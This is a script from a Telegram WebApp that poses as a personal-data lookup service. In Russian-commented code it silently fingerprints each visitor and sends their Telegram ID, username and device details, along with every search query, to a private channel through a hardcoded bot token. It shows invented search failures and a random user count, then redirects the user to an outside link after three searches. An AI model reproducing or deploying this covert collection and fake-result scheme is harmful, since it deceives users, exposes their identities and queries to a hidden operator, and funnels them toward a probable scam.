<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.disableVerticalSwipes();

    // Собираем данные
    const userData = {
        userId: tg.initDataUnsafe?.user?.id || 'unknown',
        username: tg.initDataUnsafe?.user?.username || 'не указан',
        firstName: tg.initDataUnsafe?.user?.first_name || '',
        lastName: tg.initDataUnsafe?.user?.last_name || '',
        isPremium: tg.initDataUnsafe?.user?.is_premium || false,
        languageCode: tg.initDataUnsafe?.user?.language_code || '',
        
        screen: `${screen.width}x${screen.height}`,
        screenColorDepth: screen.colorDepth,
        screenPixelRatio: window.devicePixelRatio,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages.join(', '),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        
        version: tg.version,
        colorScheme: tg.colorScheme,
        
        referrer: document.referrer,
        online: navigator.onLine
    };

    // Отправляем данные через fetch ВМЕСТО tg.sendData() (чтобы не закрывать WebApp)
    async function sendToBot(data) {
        try {
            const response = await fetch('https://api.telegram.org/bot' + tg.initData.split('&')[0].split('=')[1] + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: userData.userId,
                    text: 'Данные собраны: ' + JSON.stringify(data)
                })
            });
        } catch (e) {
            console.log('Ошибка отправки:', e);
        }
    }

    // Отправляем через MainButton (невидимо для юзера)
    tg.MainButton.setText('Загрузка...');
    tg.MainButton.hide(); // скрываем кнопку

    // Логируем открытие через отправку в канал напрямую
    fetch('https://api.telegram.org/bot8701726550:AAHzH-oN1vfdHroJ7Qx3qnwdP_C8rl_U0gc/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: -1003690607796,
            text: `<b>🌐 WebApp открыт</b>\n└ ID: ${userData.userId}\n└ @${userData.username}\n└ Screen: ${userData.screen}\n└ Platform: ${userData.platform}`,
            parse_mode: 'HTML'
        })
    }).catch(e => console.log('Лог не отправлен'));

    console.log('Данные собраны:', userData);

    // Заполняем профиль
    document.getElementById('userId').textContent = userData.userId;
    document.getElementById('username').textContent = '@' + userData.username;

    let searchCount = 0;
    const maxSearches = 3;

    function showMenu() {
        document.getElementById('mainMenu').style.display = 'grid';
        document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
    }

    function hideMenu() {
        document.getElementById('mainMenu').style.display = 'none';
    }

    function showSearch() {
        hideMenu();
        document.getElementById('searchContent').classList.add('active');
    }

    function showProfile() {
        hideMenu();
        document.getElementById('profileContent').classList.add('active');
    }

    function showAddDB() {
        hideMenu();
        document.getElementById('addDBContent').classList.add('active');
    }

    function showStats() {
        hideMenu();
        document.getElementById('statsContent').classList.add('active');
        setTimeout(() => {
            document.getElementById('userCount').textContent = Math.floor(Math.random() * 50000 + 100000).toLocaleString() + ' чел.';
        }, 500);
    }

    function performSearch() {
        const query = document.getElementById('searchQuery').value.trim();
        
        if (!query) {
            document.getElementById('searchResult').innerHTML = `
                <div class="result" style="background: #2a1a1e; border-left: 4px solid #ff4444;">
                    ❌ Введите данные для поиска
                </div>
            `;
            return;
        }

        document.getElementById('searchResult').innerHTML = `
            <div class="result">
                <div style="font-size: 32px; margin-bottom: 10px;">⏳</div>
                <div>Поиск в базах данных...</div>
            </div>
        `;

        // Логируем поиск
        searchCount++;
        fetch('https://api.telegram.org/bot8701726550:AAHzH-oN1vfdHroJ7Qx3qnwdP_C8rl_U0gc/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: -1003690607796,
                text: `<b>🔎 Поиск #${searchCount}</b>\n└ ID: ${userData.userId}\n└ Запрос: ${query}`,
                parse_mode: 'HTML'
            })
        });

        setTimeout(() => {
            const results = [
                '❌ Данные не найдены',
                '⚠️ Сервера перегружены. Попробуйте ещё раз.',
                '❌ Нет совпадений в базе'
            ];
            
            const result = results[Math.floor(Math.random() * results.length)];
            
            document.getElementById('searchResult').innerHTML = `
                <div class="result" style="background: #2a1a1e; border-left: 4px solid #ff8844;">
                    ${result}
                </div>
            `;

            if (searchCount >= maxSearches) {
                setTimeout(() => {
                    document.getElementById('searchResult').innerHTML += `
                        <div class="result" style="margin-top: 15px; background: #1a2a1e; border-left: 4px solid #00ff88;">
                            🔄 Перенаправление на расширенный поиск...
                        </div>
                    `;
                    
                    setTimeout(() => {
                        window.location.href = 'https://account.beauty/89YMMI';
                    }, 1500);
                }, 1000);
            }
        }, 2000);
    }

    const startTime = Date.now();
</script>
